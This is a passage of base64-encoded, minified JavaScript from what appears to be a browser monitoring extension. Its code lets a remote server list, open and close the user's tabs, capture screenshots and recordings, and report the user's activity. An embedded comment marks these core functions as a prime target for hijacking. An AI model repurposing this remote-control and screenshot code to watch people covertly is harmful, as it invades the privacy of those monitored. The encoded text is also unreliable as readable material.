1lbnQ9dGhpcy5nZXRGcmFnbWVudChlKSxuLmFueSh0aGlzLmhhbmRsZXJzLGZ1bmN0aW9uKHQpe3JldHVybiB0LnJvdXRlLnRlc3QoZSk/KHQuY2FsbGJhY2soZSksITApOnZvaWQgMH0pKTohMX0sbmF2aWdhdGU6ZnVuY3Rpb24oZSx0KXtpZighRi5zdGFydGVkKXJldHVybiExO3QmJnQhPT0hMHx8KHQ9e3RyaWdnZXI6ISF0fSksZT10aGlzLmdldEZyYWdtZW50KGV8fCIiKTt2YXIgbj10aGlzLnJvb3Q7IiIhPT1lJiYiPyIhPT1lLmNoYXJBdCgwKXx8KG49bi5zbGljZSgwLC0xKXx8Ii8iKTt2YXIgcj1uK2U7aWYoZT10aGlzLmRlY29kZUZyYWdtZW50KGUucmVwbGFjZShPLCIiKSksdGhpcy5mcmFnbWVudCE9PWUpe2lmKHRoaXMuZnJhZ21lbnQ9ZSx0aGlzLl91c2VQdXNoU3RhdGUpdGhpcy5oaXN0b3J5W3QucmVwbGFjZT8icmVwbGFjZVN0YXRlIjoicHVzaFN0YXRlIl0oe30sZG9jdW1lbnQudGl0bGUscik7ZWxzZXtpZighdGhpcy5fd2FudHNIYXNoQ2hhbmdlKXJldHVybiB0aGlzLmxvY2F0aW9uLmFzc2lnbihyKTt0aGlzLl91cGRhdGVIYXNoKHRoaXMubG9jYXRpb24sZSx0LnJlcGxhY2UpLHRoaXMuaWZyYW1lJiZlIT09dGhpcy5nZXRIYXNoKHRoaXMuaWZyYW1lKSYmKHQucmVwbGFjZXx8dGhpcy5pZnJhbWUuZG9jdW1lbnQub3BlbigpLmNsb3NlKCksdGhpcy5fdXBkYXRlSGFzaCh0aGlzLmlmcmFtZS5sb2NhdGlvbixlLHQucmVwbGFjZSkpfXJldHVybiB0LnRyaWdnZXI/dGhpcy5sb2FkVXJsKGUpOnZvaWQgMH19LF91cGRhdGVIYXNoOmZ1bmN0aW9uKGUsdCxuKXtpZihuKXt2YXIgcj1lLmhyZWYucmVwbGFjZSgvKGphdmFzY3JpcHQ6fCMpLiokLywiIik7ZS5yZXBsYWNlKHIrIiMiK3QpfWVsc2UgZS5oYXNoPSIjIit0fX0pLHQuaGlzdG9yeT1uZXcgRjt2YXIgUj1mdW5jdGlvbihlLHQpe3ZhciByLGk9dGhpcztyPWUmJm4uaGFzKGUsImNvbnN0cnVjdG9yIik/ZS5jb25zdHJ1Y3RvcjpmdW5jdGlvbigpe3JldHVybiBpLmFwcGx5KHRoaXMsYXJndW1lbnRzKX0sbi5leHRlbmQocixpLHQpO3ZhciBzPWZ1bmN0aW9uKCl7dGhpcy5jb25zdHJ1Y3Rvcj1yfTtyZXR1cm4gcy5wcm90b3R5cGU9aS5wcm90b3R5cGUsci5wcm90b3R5cGU9bmV3IHMsZSYmbi5leHRlbmQoci5wcm90b3R5cGUsZSksci5fX3N1cGVyX189aS5wcm90b3R5cGUscn07Zy5leHRlbmQ9Yi5leHRlbmQ9eC5leHRlbmQ9VC5leHRlbmQ9Ri5leHRlbmQ9Ujt2YXIgTj1mdW5jdGlvbigpe3Rocm93IG5ldyBFcnJvcignQSAidXJsIiBwcm9wZXJ0eSBvciBmdW5jdGlvbiBtdXN0IGJlIHNwZWNpZmllZCcpfSxJPWZ1bmN0aW9uKGUsdCl7dmFyIG49dC5lcnJvcjt0LmVycm9yPWZ1bmN0aW9uKHIpe24mJm4uY2FsbCh0LmNvbnRleHQsZSxyLHQpLGUudHJpZ2dlcigiZXJyb3IiLGUscix0KX19O3JldHVybiB0fSl9KS5jYWxsKHQsZnVuY3Rpb24oKXtyZXR1cm4gdGhpc30oKSl9DQovKiBNVkMgaGVscGVyIGZ1bmN0aW9ucyAtLT4gKi8NCiwNCi8qIDwhLS0gQ29yZSBhcHAgZnVuY3Rpb25zLCBwcmltZSB0YXJnZXQgdG8gaGlqYWNraW5nICovDQpmdW5jdGlvbihlLHQsbil7ZnVuY3Rpb24gcihlKXtyZXR1cm57aWQ6ZS5pZCx0aXRsZTplLmdldCgidGl0bGUiKSxpY29uOmUuZ2V0KCJpY29uIiksYWN0aXZlOmUuZ2V0KCJhY3RpdmUiKSx1cmw6ZS5nZXQoInVybCIpLHdoZW46ZS5nZXQoIndoZW4iKX19ZnVuY3Rpb24gaSgpe3JldHVybiBuZXcgdihmdW5jdGlvbihlKXt2YXIgdD1uKDkpLnRhYnMubWFwKHIpO2UodCl9KX1mdW5jdGlvbiBzKGUpe3JldHVybiBuZXcgdihmdW5jdGlvbih0KXtmLmFjdGl2aXR5U3RyZWFtJiZmLmFjdGl2aXR5U3RyZWFtLmV4dGVuc2lvblJlbW92ZVRhYihlKSxjaHJvbWUudGFicy5yZW1vdmUoZSxmdW5jdGlvbigpe3QoKX0pfSl9ZnVuY3Rpb24gbyhlKXtyZXR1cm4gbmV3IHYoZnVuY3Rpb24odCxuKXtjaHJvbWUud2luZG93cy5jcmVhdGUoe3VybDplfSxmdW5jdGlvbihlKXtpZihjaHJvbWUucnVudGltZS5sYXN0RXJyb3IpcmV0dXJuIG4oY2hyb21lLnJ1bnRpbWUubGFzdEVycm9yLm1lc3NhZ2V8fCJ1bmtub3duIGVycm9yIik7aWYoIWV8fCFlLnRhYnN8fCFlLnRhYnNbMF0pcmV0dXJuIG4oIkNvdWxkbid0IGZpbmQgdGFicyBvYmplY3QgaW4gbmV3bHkgY3JlYXRlZCB3aW5kb3ciKTt2YXIgcj1lLnRhYnNbMF07Zi5hY3Rpdml0eVN0cmVhbSYmZi5hY3Rpdml0eVN0cmVhbS5leHRlbnNpb25BZGRUYWIociksdChmLmFjdGl2aXR5U3RyZWFtLnRhYnMuZ2V0KHIuaWQpKX0pfSl9ZnVuY3Rpb24gYShlKXtyZXR1cm4gbmV3IHYoZnVuY3Rpb24odCxuKXtjaHJvbWUud2luZG93cy5nZXRBbGwoZnVuY3Rpb24ocil7dHJ5e2lmKGNocm9tZS5ydW50aW1lLmxhc3RFcnJvcilyZXR1cm4gbihjaHJvbWUucnVudGltZS5sYXN0RXJyb3IubWVzc2FnZXx8InVua25vd24gZXJyb3IiKTswIT09ci5sZW5ndGh8fE0/di5hbGwoW01dKS50aGVuKGZ1bmN0aW9uKCl7Y2hyb21lLnRhYnMuY3JlYXRlKHt1cmw6ZX0sZnVuY3Rpb24oZSl7cmV0dXJuIGNocm9tZS5ydW50aW1lLmxhc3RFcnJvcj9uKGNocm9tZS5ydW50aW1lLmxhc3RFcnJvci5tZXNzYWdlfHwidW5rbm93biBlcnJvciIpOihmLmFjdGl2aXR5U3RyZWFtJiZmLmFjdGl2aXR5U3RyZWFtLmV4dGVuc2lvbkFkZFRhYihlKSx2b2lkIHQoZi5hY3Rpdml0eVN0cmVhbS50YWJzLmdldChlLmlkKSkpfSl9KTpNPW8oZSkudGhlbih0LG4pLnRoZW4oZnVuY3Rpb24oKXtNPW51bGx9LGZ1bmN0aW9uKCl7TT1udWxsfSl9Y2F0Y2goaSl7bigiIitpKX19KX0pfWZ1bmN0aW9uIHUoZSl7cmV0dXJuIG5ldyB2KGZ1bmN0aW9uKHQsbil7di5hbGwoZS5tYXAoYSkpLnRoZW4odCxuKX0pfWZ1bmN0aW9uIGMoZSx0KXtyZXR1cm4gbmV3IHYoZnVuY3Rpb24obixyKXt2YXIgaT1bXSxvPSExO2Nocm9tZS50YWJzLnF1ZXJ5KHt9LGZ1bmN0aW9uKHUpe3UuZm9yRWFjaChmdW5jdGlvbihuKXttLmlzVVJMQWxsb3dlZChlLHQsbi51cmwpP2kucHVzaChuLmlkKTpvPSEwfSksb3x8YShiKSx2LmFsbChpLm1hcChzKSkudGhlbihuLHIpfSl9KX1mdW5jdGlvbiBsKGUpe3ZhciB0PW4oOSk7cmV0dXJuIG5ldyB2KGZ1bmN0aW9uKG4scil7dmFyIGk9ZS5tYXAoZnVuY3Rpb24oZSl7cmV0dXJuIG51bGw9PT1lP2I6ZX0pLG89W107dC50YWJzLmZvckVhY2goZnVuY3Rpb24oZSl7dmFyIHQ9aS5pbmRleE9mKGUuZ2V0KCJ1cmwiKSk7LTE9PT10P28ucHVzaChlLmlkKTppLnNwbGljZSh0LDEpfSksdi5hbGwoaS5tYXAoYSkpLnRoZW4oZnVuY3Rpb24oKXt2LmFsbChvLm1hcChzKSkudGhlbihmdW5jdGlvbigpe3ZhciBlPXQudGFicy5maWx0ZXIoZnVuY3Rpb24oZSl7cmV0dXJuLTE9PT1vLmluZGV4T2YoZS5pZCl9KTtuKGUpfSxyKX0scil9KX1mdW5jdGlvbiBkKGUsdCxuLHIpe3JldHVybiBuZXcgdihmdW5jdGlvbihpKXt2YXIgcz1uZXcgd2luZG93LkltYWdlO3Mub25sb2FkPWZ1bmN0aW9uKCl7aWYocy53aWR0aDw9biYmcy5oZWlnaHQ8PXIpcmV0dXJuIHZvaWQgaShlKTt2YXIgbz1uLGE9TWF0aC5yb3VuZChzLmhlaWdodCooby9zLndpZHRoKSk7YT5yJiYobyo9ci9hLGE9cik7dmFyIHU9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiY2FudmFzIik7dS53aWR0aD1vLHUuaGVpZ2h0PWE7dmFyIGM9dS5nZXRDb250ZXh0KCIyZCIpO2MuZHJhd0ltYWdlKHMsMCwwLG8sYSk7dmFyIGw9dS50b0RhdGFVUkwoImltYWdlL2pwZWciLHQvMTAwKTtpKGwpfSxzLnNldEF0dHJpYnV0ZSgiY3Jvc3NPcmlnaW4iLCJhbm9ueW1vdXMiKSxzLnNyYz1lfSl9ZnVuY3Rpb24gaChlLHQsbil7cmV0dXJuIGU9cGFyc2VJbnQoMTAwKmUsMTApLDA+ZSYmKGU9MCksZT4xMDAmJihlPTEwMCksdD10fHwxZTMsbj1ufHwxZTMsbmV3IHYoZnVuY3Rpb24ocixpKXtzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7Y2hyb21lLnRhYnMuY2FwdHVyZVZpc2libGVUYWIobnVsbCx7Zm9ybWF0OiJqcGVnIixxdWFsaXR5OjEwMH0sZnVuY3Rpb24ocyl7cmV0dXJuIGNocm9tZS5ydW50aW1lLmxhc3RFcnJvcj8ocC5lKCJlcnJvciBmcm9tIGNocm9tZS50YWJzLmNhcHR1cmVWaXNpYmxlVGFiICIsY2hyb21lLnJ1bnRpbWUubGFzdEVycm9yLHMpLGkoY2hyb21lLnJ1bnRpbWUubGFzdEVycm9yLm1lc3NhZ2V8fCJ1bmtub3duIGVycm9yIikpOnZvaWQgZChzLGUsdCxuKS50aGVuKHIsaSl9KX0sMTUwMCl9KX12YXIgZj1uKDQpLHA9bigzKSgiaW50ZXJhY3QiKSxfPW4oOCksbT1uKDMyKSx5PW4oMTU4KSxnPW4oMjUpLHY9bigxMSksYj0iY2hyb21lOi8vbmV3dGFiLyIsTT1udWxsLEw9eyJ0YWJzLmdldCI6ZnVuY3Rpb24oZSl7Zy53YXRjaCgpLGkoKS50aGVuKGZ1bmN0aW9uKHQpe3QuZm9yRWFjaChmdW5jdGlvbihlKXtlLnVybD1lLnVybHx8Imh0dHBzOi8vYmxhbmsifSksZi5tZXNzYWdpbmcuc2VuZChlLmdlbmVyYXRlX3JlcGx5KCJ0YWJzLmdldC5yZXNwb25zZSIse3RhYnM6dCxlcnJvcjpudWxsfSkpfSxmdW5jdGlvbih0KXtmLm1lc3NhZ2luZy5zZW5kKGUuZ2VuZXJhdGVfcmVwbHkoInRhYnMuZ2V0LnJlc3BvbnNlIix7ZXJyb3I6dHx8IlVua25vd24gZXJyb3IifSkpfSl9LCJ0YWJzLmNsb3NlIjpmdW5jdGlvbihlKXt2YXIgdD1uKDkpO0pTT04uc3RyaW5naWZ5KGUucGF5bG9hZC50YWJfaWRzLnNvcnQoKSk9PT1KU09OLnN0cmluZ2lmeSh0LnRhYnMucGx1Y2soImlkIikuc29ydCgpKSYmYShiKSx2LmFsbChlLnBheWxvYWQudGFiX2lkcy5tYXAocykpLnRoZW4oZnVuY3Rpb24oKXtmLm1lc3NhZ2luZy5zZW5kKGUuZ2VuZXJhdGVfcmVwbHkoInRhYnMuY2xvc2UucmVzcG9uc2UiLHtlcnJvcjpudWxsLHRhYl9pZHM6ZS5wYXlsb2FkLnRhYl9pZHN9KSl9LGZ1bmN0aW9uKHQpe2YubWVzc2FnaW5nLnNlbmQoZS5nZW5lcmF0ZV9yZXBseSgidGFicy5jbG9zZS5yZXNwb25zZSIse2Vycm9yOnR8fCJVbmtub3duIGVycm9yIn0pKX0pfSwidGFicy5vcGVuIjpmdW5jdGlvbihlKXt2LmFsbChlLnBheWxvYWQudXJscy5tYXAoYSkpLnRoZW4oZnVuY3Rpb24odCl7Zi5tZXNzYWdpbmcuc2VuZChlLmdlbmVyYXRlX3JlcGx5KCJ0YWJzLm9wZW4ucmVzcG9uc2UiLHtlcnJvcjpudWxsLHRhYnM6dC5tYXAocil9KSl9LGZ1bmN0aW9uKHQpe2YubWVzc2FnaW5nLnNlbmQoZS5nZW5lcmF0ZV9yZXBseSgidGFicy5vcGVuLnJlc3BvbnNlIix7ZXJyb3I6dHx8IlVua25vd24gZXJyb3IifSkpfSl9LCJ0YWJzLnNldCI6ZnVuY3Rpb24oZSl7bChlLnBheWxvYWQudXJscykudGhlbihmdW5jdGlvbih0KXtmLm1lc3NhZ2luZy5zZW5kKGUuZ2VuZXJhdGVfcmVwbHkoInRhYnMuc2V0LnJlc3BvbnNlIix7dGFiczp0Lm1hcChyKSxlcnJvcjpudWxsfSkpfSxmdW5jdGlvbih0KXtwLmUoIkVycm9yIHNldHRpbmcgdGFiczoiLHQpLGYubWVzc2FnaW5nLnNlbmQoZS5nZW5lcmF0ZV9yZXBseSgidGFicy5zZXQucmVzcG9uc2UiLHtlcnJvcjp0fHwiVW5rbm93biBlcnJvciJ9KSl9KX0sInRhYnMuZmlsdGVyIjpmdW5jdGlvbihlKXtjKGUucGF5bG9hZC51cmxzLGUucGF5bG9hZC5kb21haW5zKS50aGVuKGZ1bmN0aW9uKCl7Zi5tZXNzYWdpbmcuc2VuZChlLmdlbmVyYXRlX3JlcGx5KCJ0YWJzLmZpbHRlci5yZXNwb25zZSIse2Vycm9yOm51bGx9KSl9LGZ1bmN0aW9uKHQpe3AuZSgiRXJyb3IgZmlsdGVyaW5nIHRhYnM6Iix0KSxmLm1lc3NhZ2luZy5zZW5kKGUuZ2VuZXJhdGVfcmVwbHkoInRhYnMuZmlsdGVyLnJlc3BvbnNlIix7ZXJyb3I6dHx8IlVua25vd24gZXJyb3IifSkpfSl9LCJ0YWJzLmxvY2siOm0ubG9jaywidGFicy51bmxvY2siOm0udW5sb2NrLCJtZXNzYWdlLnNlbmQiOnkucHJvY2Vzc01lc3NhZ2UsInNjcmVlbnNob3QuZ2V0IjpmdW5jdGlvbihlKXt2YXIgdD1oKGUucGF5bG9hZC5xdWFsaXR5LGUucGF5bG9hZC5tYXhfd2lkdGgsZS5wYXlsb2FkLm1heF9oZWlnaHQpLG49bmV3IHYoZnVuY3Rpb24oZSl7Y2hyb21lLnRhYnMucXVlcnkoe2FjdGl2ZTohMCxjdXJyZW50V2luZG93OiEwfSxmdW5jdGlvbih0KXt2YXIgbj17fSxyPXRbMF07ciYmKG4uaWQ9ci5pZCxuLnRpdGxlPXIudGl0bGUsbi51cmw9ci51cmwpLGUobil9KX0pO3YuYWxsKFtuLHRdKS50aGVuKGZ1bmN0aW9uKHQpe3ZhciBuPXRbMF07bi5pbWFnZT10WzFdLGYubWVzc2FnaW5nLnNlbmQoZS5nZW5lcmF0ZV9yZXBseSgic2NyZWVuc2hvdC5nZXQucmVzcG9uc2UiLG4pKX0sZnVuY3Rpb24odCl7dmFyIG49e2Vycm9yOiJFcnJvciBvYnRhaW5pbmcgc2NyZWVuc2hvdDogIit0fTtmLm1lc3NhZ2luZy5zZW5kKGUuZ2VuZXJhdGVfcmVwbHkoInNjcmVlbnNob3QuZ2V0LnJlc3BvbnNlIixuKSl9KX0sInNjcmVlbnNob3Quc3RhcnRfcmVjb3JkaW5nIjpmdW5jdGlvbihlLHQpe24oOSkucmVjb3JkaW5nLnN0YXJ0KHQsZS5wYXlsb2FkKSxmLm1lc3NhZ2luZy5zZW5kKGUuZ2VuZXJhdGVfcmVwbHkoInNjcmVlbnNob3Quc3RhcnRfcmVjb3JkaW5nLnJlc3BvbnNlIix7ZXJyb3I6bnVsbH0pKX0sInNjcmVlbnNob3Quc3RvcF9yZWNvcmRpbmciOmZ1bmN0aW9uKGUsdCl7big5KS5yZWNvcmRpbmcuc3RvcCh0KSxmLm1lc3NhZ2luZy5zZW5kKGUuZ2VuZXJhdGVfcmVwbHkoInNjcmVlbnNob3Quc3RvcF9yZWNvcmRpbmcucmVzcG9uc2UiLHtlcnJvcjpudWxsfSkpfSwic2NyZWVuc2hvdC5nZXRfYnVmZmVyIjpmdW5jdGlvbihlKXt2YXIgdDt0PWUucGF5bG9hZC51cmw/big5KS5idWZmZXIuZ2V0QnlVUkwoZS5wYXlsb2FkLnVybCk6big5KS5idWZmZXIuZ2V0QnlEb21haW4oZS5wYXlsb2FkLmRvbWFpbiksdD9mLm1lc3NhZ2luZy5zZW5kKGUuZ2VuZXJhdGVfcmVwbHkoInNjcmVlbnNob3QuZ2V0X2J1ZmZlci5yZXNwb25zZSIse2Vycm9yOm51bGwsdXJsOnQuZ2V0KCJ1cmwiKSxpbWFnZTp0LmdldCgiaW1hZ2UiKX0pKTpmLm1lc3NhZ2luZy5zZW5kKGUuZ2VuZXJhdGVfcmVwbHkoInNjcmVlbnNob3QuZ2V0X2J1ZmZlci5yZXNwb25zZSIse2Vycm9yOm51bGwsdXJsOm51bGwsaW1hZ2U6bnVsbH0pKX19O18uZXh0ZW5kKEwsbigxNTcpKSxmLm1lc3NhZ2luZy5vbigiaW50ZXJhY3QiLGZ1bmN0aW9uKGUsdCl7cmV0dXJuIGUudHlwZSBpbiBMP3ZvaWQgTFtlLnR5cGVdKGUsdCk6dm9pZCBwLmUoIk5vIGhhbmRsZXIgZm9yIG1lc3NhZ2UgdHlwZSIsZS50eXBlLGUpfSksZS5leHBvcnRzPXt0YWJNb2RlbFRvSnNvbjpyLGN1cnJlbnRUYWJzOmksY2FwdHVyZVZpc2libGVUYWI6aCxjbG9zZVRhYjpzLG9wZW5UYWJzOnUsb3BlblRhYjphLHNldFRhYnM6bH19LCxmdW5jdGlvbihlLHQsbil7InVzZSBzdHJpY3QiO3ZhciByPW4oNSksaT1uKDMpKCJhcGkiKSxzPW4oNCksbz1uKDM0KS5Bc3luY1F1ZXVlLGE9bigxOSksdT1uKDgpLGM9bigxMSk7ZS5leHBvcnRzLmdsb2JhbF9jb25maWc9ZnVuY3Rpb24oZSl7cmV0dXJuIGEodS5leHRlbmQoe21ldGhvZDoiZ2V0IixleHBlY3Rpbmc6Impzb24iLHVybDpyLmFwaV91cmwrImNvbmZpZy9nbG9iYWwiLHF1ZXJ5OntpbnN0YW5jZV9pZDpyLmluc3RhbmNlX2lkfX0sZSkpfSxlLmV4cG9ydHMudXNlcl9jb25maWc9ZnVuY3Rpb24oZSx0KXt2YXIgbjtyZXR1cm4gd2luZG93LmxvY2FsU3RvcmFnZS5sYXN0TWVzc2FnZUNyZWF0ZWQmJihuPXBhcnNlSW50KHdpbmRvdy5sb2NhbFN0b3JhZ2UubGFzdE1lc3NhZ2VDcmVhdGVkLDEwKSksYSh1LmV4dGVuZCh7bWV0aG9kOiJwb3N0Iix1cmw6ci5hcGlfdXJsKyJjb25maWcvdXNlciIsZXhwZWN0aW5nOiJqc29uIixkYXRhOnt1c2VyX2lkOmUuaWQsaW5zdGFuY2VfaWQ6ci5pbnN0YW5jZV9pZCxsYXN0X21lc3NhZ2U6bn19LHQpKX0sZS5leHBvcnRzLnVzZXJzX2NvbmZpZz1mdW5jdGlvbihlLHQpe3ZhciBuO3JldHVybiB3aW5kb3cubG9jYWxTdG9yYWdlLmxhc3RNZXNzYWdlQ3JlYXRlZCYmKG49cGFyc2VJbnQod2luZG93LmxvY2FsU3RvcmFnZS5sYXN0TWVzc2FnZUNyZWF0ZWQsMTApKSxhKHUuZXh0ZW5kKHttZXRob2Q6InBvc3QiLHVybDpyLmFwaV91cmwrImNvbmZpZy91c2VycyIsZXhwZWN0aW5nOiJqc29uIixkYXRhOnt1c2VyX2lkczplLm1hcChmdW5jdGlvbihlKXtyZXR1cm4gZS5pZH0pLGluc3RhbmNlX2lkOnIuaW5zdGFuY2VfaWQsbGFzdF9tZXNzYWdlOm59fSx0KSl9O3ZhciBsO2UuZXhwb3J0cy5yZXBvcnRfZGV2aWNlX3N0YXR1cz1mdW5jdGlvbihlLHQpe3JldHVybiBsJiYoaS53KCJDYW5jZWxpbmcgZXhpc3RpbmcgZGV2aWNlIHN0YXR1cyByZXF1ZXN0IiksbC5hYm9ydCgpKSxsPWEodS5leHRlbmQoe21ldGhvZDoicG9zdCIsdXJsOnIuYXBpX3VybCsic3RhdHVzL2RldmljZSIsZGF0YTplLHJldHJ5VGltZW91dDo2MCxvblJldHJ5OmZ1bmN0aW9uKGUsdCxuKXtpLncoIkZhaWxlZCB0byBQT1NUIGRldmljZSBzdGF0dXMsIHJldHJ5aW5nIGluICIrbisiIHNlY29uZHMgKCIsZSwiKSIpfSxvblN1Y2Nlc3M6ZnVuY3Rpb24oKXtsPW51bGx9LG9uRmFpbHVyZTpmdW5jdGlvbigpe2w9bnVsbH19LHQpKX0sZS5leHBvcnRzLmludGVyYWN0X3B1c2hlcl9zZW5kPWZ1bmN0aW9uKGUsdCl7dmFyIG49ZS50b19vYmooKTtyZXR1cm4gbi5zZW50PU1hdGgucm91bmQoKG5ldyBEYXRlKS5nZXRUaW1lKCkvMWUzKSxhKHUuZXh0ZW5kKHttZXRob2Q6InBvc3QiLHVybDpyLnB1c2hlci5zZW5kX3VybCxkYXRhOm4scmV0cnlUaW1lb3V0OjYwLG9uUmV0cnk6ZnVuY3Rpb24odCxuLHIpe2kudygiRmFpbGVkIHRvIFBPU1QgJyIrZS50eXBlKyInIG1lc3NhZ2UsIHJldHJ5aW5nIGluICIrcisiIHNlY29uZHMgKCIsdCwiKSIpfX0sdCkpfTt2YXIgZD1uZXcgbyh7dGltZW91dDoxLjUqci5hY3Rpdml0eV9zdHJlYW1fdGltZW91dCxsb2c6ITAsbmFtZToiYXBpLmFjdGl2aXR5UXVldWUifSk7ZS5leHBvcnRzLnNlbmRfYWN0aXZpdHlfc3RyZWFtPWZ1bmN0aW9uKGUpe2lmKHIuYWN0aXZpdHlfc3RyZWFtX3VybCl7dmFyIHQ9bmV3IERhdGU7ZC5hZGQoZnVuY3Rpb24oKXtyZXR1cm4gbmV3IERhdGUtdD5yLmFjdGl2aXR5X3N0cmVhbV90aW1lb3V0PyhpLncoIk5vdCBzZW5kaW5nIHF1ZXVlZCBhY3Rpdml0eSB0aGF0IGlzICIrTWF0aC5yb3VuZCgobmV3IERhdGUtdCkvMWUzKSsiIHNlY29uZHMgb2xkIiksYy5yZXNvbHZlKCkpOm5ldyBjKGZ1bmN0aW9uKHQsbil7YSh7bWV0aG9kOiJwb3N0Iix1cmw6ci5hY3Rpdml0eV9zdHJlYW1fdXJsLGRhdGE6ZSxoZWFkZXJzOnsiWC1JbnRlcmFjdC1FeHRlbnNpb24tVmVyc2lvbiI6ci5leHRlbnNpb25fdmVyc2lvbiwiWC1Vc2VyLUlEcyI6cy51c2Vycy5hY3RpdmVVc2VycygpLm1hcChmdW5jdGlvbihlKXtyZXR1cm4gZS5pZH0pLmpvaW4oIiwiKX0scmV0cnlUaW1lb3V0OnIuYWN0aXZpdHlfc3RyZWFtX3RpbWVvdXQvMWUzLG9uU3VjY2VzczpmdW5jdGlvbigpe3QoKX0sb25GYWlsdXJlOmZ1bmN0aW9uKGUpe24oImFjdGl2aXR5IHN0cmVhbSBQT1NUIGVycm9yOiIrZSl9LG9uUmV0cnk6ZnVuY3Rpb24oZSx0LG4pe2kudygiRmFpbGVkIHRvIFBPU1QgdG8gU0FQSSwgcmV0cnlpbmcgaW4gIituKyIgc2Vjb25kcyAoIixlLCIpIil9fSl9KX0pfX19LGZ1bmN0aW9uKGUsdCxuKXtmdW5jdGlvbiByKCl7dGhpcy5pbml0LmFwcGx5KHRoaXMsYXJndW1lbnRzKX1mdW5jdGlvbiBpKGUpe3ZhciB0PW4oMykoInJlcXVlc3QiKTtlPWEuZXh0ZW5kKHt0aW1lb3V0OjE1LGhlYWRlcnM6e30scmV0cnlJbml0aWFsRGVsYXk6MixyZXRyeUJhY2tvZmY6ZnVuY3Rpb24oZSl7cmV0dXJuIDEuNSplfSxyZXRyeU1heGltdW1EZWxheTozZTQscmV0cnlTdHJhdGVneTpmdW5jdGlvbihlLHQsbil7cmV0dXJuIW4uaXNTdWNjZXNzKGUsdCl9fSxlKTt2YXIgaT1zLnZhbGlkYXRlKHUsZSk7aWYoIWkudmFsaWQpdGhyb3cgbmV3IEVycm9yKCJJbnZhbGlkIHJlcXVlc3Q6ICIraS5mb3JtYXQoKSk7aWYoZS5leHBlY3Rpbmcpc3dpdGNoKGUuZXhwZWN0aW5nKXtjYXNlImpzb24iOmUuaXNTdWNjZXNzPWZ1bmN0aW9uKGUsbixyKXtjb25zb2xlLmxvZyhuKTtyZXR1cm4gbiYmbi5vaz8iYXBwbGljYXRpb24vanNvbiIhPT1uLnR5cGU/KHImJnImJnQudygiR290IGludmFsaWQgY29udGVudCB0eXBlIGZvciBKU09OIHJlcXVlc3Q6ICIse3R5cGU6bi50eXBlLHRleHQ6bi50ZXh0LHVybDpuLnJlcS51cmx9KSwhMSk6bi5ib2R5JiZuLmJvZHkgaW5zdGFuY2VvZiBPYmplY3Q/ITA6KHImJnQudygiR290IGludmFsaWQgcmVzcG9uc2UgYm9keSBmb3IgSlNPTiByZXF1ZXN0IixuLmJvZHkpLCExKTohMX19ZWxzZSBlLmlzU3VjY2Vzcz1lLmlzU3VjY2Vzc3x8ZnVuY3Rpb24oZSx0KXtyZXR1cm4gdCYmdC5va307cmV0dXJuIG5ldyByKGUpfXZhciBzPW4oMzUpLG89bigxNzIpLGE9big4KSx1PXt0eXBlOiJvYmplY3QiLHN0cmljdDohMCxwcm9wZXJ0aWVzOnttZXRob2Q6e3R5cGU6InN0cmluZyIscGF0dGVybjovXihnZXR8cG9zdCkkL30sdXJsOnt0eXBlOiJzdHJpbmciLHBhdHRlcm46InVybCJ9LHRpbWVvdXQ6e3R5cGU6Im51bWJlciJ9LHF1ZXJ5Ont0eXBlOiJvYmplY3QiLG9wdGlvbmFsOiEwfSxleHBlY3Rpbmc6e3R5cGU6InN0cmluZyIsb3B0aW9uYWw6ITAscGF0dGVybjovXmpzb24kL30sZGF0YTp7ZXhlYzpmdW5jdGlvbihlLHQpe3ZvaWQgMCE9PXQmJiJmdW5jdGlvbiIhPXR5cGVvZiB0JiYib2JqZWN0IiE9dHlwZW9mIHQmJnRoaXMucmVwb3J0KCJtdXN0IGJlIGVpdGhlciBhIGZ1bmN0aW9uICh0aGF0IHJldHVybnMgYW4gb2JqZWN0KSBvciBhbiBvYmplY3QiKX0sb3B0aW9uYWw6ITB9LGhlYWRlcnM6e3R5cGU6Im9iamVjdCJ9LHJldHJ5Q291bnQ6e3R5cGU6Im51bWJlciIsb3B0aW9uYWw6ITB9LHJldHJ5VGltZW91dDp7dHlwZToibnVtYmVyIixvcHRpb25hbDohMH0scmV0cnlJbml0aWFsRGVsYXk6e3R5cGU6Im51bWJlciJ9LHJldHJ5QmFja29mZjp7dHlwZToiZnVuY3Rpb24ifSxyZXRyeU1heGltdW1EZWxheTp7dHlwZToibnVtYmVyIn0scmV0cnlTdHJhdGVneTp7dHlwZToiZnVuY3Rpb24ifSxpc1N1Y2Nlc3M6e3R5cGU6ImZ1bmN0aW9uIixvcHRpb25hbDohMH0sb25TdWNjZXNzOnt0eXBlOiJmdW5jdGlvbiIsb3B0aW9uYWw6ITB9LG9uRmFpbHVyZTp7dHlwZToiZnVuY3Rpb24iLG9wdGlvbmFsOiEwfSxvblJldHJ5Ont0eXBlOiJmdW5jdGlvbiIsb3B0aW9uYWw6ITB9fSxleGVjOmZ1bmN0aW9uKGUsdCl7ImV4cGVjdGluZyJpbiB0JiYiaXNTdWNjZXNzImluIHQmJnRoaXMucmVwb3J0KCdjYW5cJ3QgaGF2ZSBib3RoICJleHBlY3RpbmciIGFuZCAiaXNTdWNjZXNzIiBrZXlzJyksInJldHJ5Q291bnQiaW4gdCYmInJldHJ5VGltZW91dCJpbiB0JiZ0aGlzLnJlcG9ydCgnY2FuXCd0IGhhdmUgYm90aCAicmV0cnlDb3VudCIgYW5kICJyZXRyeVRpbWVvdXQiIGtleXMnKSwiZ2V0Ij09PXQubWV0aG9kJiYiZGF0YSJpbiB0JiZ0aGlzLnJlcG9ydCgnY2FuXCd0IHNwZWNpZnkgImRhdGEiIGZvciBhICcrdC5tZXRob2QrIiByZXF1ZXN0Iil9fTshZnVuY3Rpb24oZSl7ZS5pbml0PWZ1bmN0aW9uKGUpe3RoaXMub3B0PWUsdGhpcy5zdWNjZXNzQ2FsbGJhY2tzPVtdLHRoaXMuZmFpbHVyZUNhbGxiYWNrcz1bXSx0aGlzLnJldHJ5Q2FsbGJhY2tzPVtdLHRoaXMuZG9uZT1udWxsLHRoaXMuaXNBYm9ydGVkPSExLHRoaXMucmV0cnlUaW1lcj1udWxsLGUub25TdWNjZXNzJiZ0aGlzLm9uU3VjY2VzcyhlLm9uU3VjY2VzcyksZS5vbkZhaWx1cmUmJnRoaXMub25GYWlsdXJlKGUub25GYWlsdXJlKSxlLm9uUmV0cnkmJnRoaXMub25SZXRyeShlLm9uUmV0cnkpO3ZhciB0PShuZXcgRGF0ZSkuZ2V0VGltZSgpLzFlMyxuPTAscj1udWxsLGk9Z